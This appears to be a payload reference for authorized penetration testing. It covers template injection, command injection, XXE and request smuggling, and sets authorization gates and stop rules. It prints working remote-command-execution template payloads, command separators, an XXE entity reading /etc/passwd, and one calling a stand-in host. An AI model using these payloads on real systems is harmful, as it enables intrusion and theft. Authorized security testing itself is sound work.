# Payload Family References

Payloads here are conditional probe shapes. Do not fire every row. Select the smallest low-impact probe that matches the evidenced parser or feature, save the raw request/response, and stop when the next step would require destructive execution, bulk traffic, or real-user impact without current-turn authorization.

## SSTI Probe Ladder

| Probe shape | Expected signal | Notes |
|---|---|---|
| `{{7*7}}` | `49` in Jinja2/Twig-like engines | Low-impact arithmetic probe |
| `${7*7}` | `49` in Freemarker/Pebble/Velocity-like engines | Use when `${...}` syntax is accepted |
| `<%= 7*7 %>` | `49` in ERB-like engines | Use in Ruby template suspicion |
| `#{7*7}` | `49` in Mako or Ruby-like contexts | Context-dependent |
| `*{7*7}` | `49` in Thymeleaf-like contexts | Java/Spring suspicion |
| `{{7*'7'}}` | Engine differentiation | Jinja2-style string multiplication vs Twig behavior |

Where to test: profile text, email/template names, custom error messages, PDF/report generators, path parameters, and reflected search output. Choose based on observed reflection and template context.

## SSTI Gated RCE Examples

Use only after harmless arithmetic proves server-side evaluation and authorization allows deeper validation.

```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

```php
{{["id"]|filter("system")}}
```

```text
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

```ruby
<%= `id` %>
```

Evidence gate: harmless evaluation -> engine identification -> controlled command output or read-back in a sandbox/lab/explicitly authorized target -> raw evidence. Prefer `id`/environment-neutral commands and never run destructive commands.

## Command Injection Probe Ladder

| Probe family | Example shape | Observation |
|---|---|---|
| Separator baseline | `; id`, `&& id`, `| id` | Output channel or syntax difference |
| Blind timing | `; sleep 3` | Bounded delay with stable baseline |
| OOB callback | controlled callback command | Requires authorized OOB listener |
| Space bypass | `${IFS}`, tabs, brace expansion | Only after a filter is evidenced |
| Keyword bypass | quote splitting, variable expansion | Only after blocked keyword evidence |

Stop if timing is noisy, endpoint is state-changing, or OOB would touch third-party infrastructure without approval.

## XXE Probe Families

Use when XML/SVG/Office/PDF conversion or parser behavior is evidenced.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://callback.example/xxe">]>
<foo>&xxe;</foo>
```

For uploads, preserve original archive/image/XML request, conversion output, and read-back evidence. Prefer harmless local file or controlled callback in labs; real targets require explicit authorization for sensitive file reads or OOB.

## HTTP Request Smuggling Probe Families

Keep smuggling checks scripted and evidence-oriented. Manual browser behavior alone is not enough.

| Family | Signal |
|---|---|
| CL.TE | Frontend trusts Content-Length, backend trusts Transfer-Encoding |
| TE.CL | Frontend trusts Transfer-Encoding, backend trusts Content-Length |
| TE.TE | One layer ignores obfuscated Transfer-Encoding |
| H2.CL | HTTP/2 frontend downgrades or forwards conflicting length |

Evidence gate: timeout/desync baseline, response queue poisoning or capture proof, cache/request-boundary proof if chaining, and raw request/response pairs.
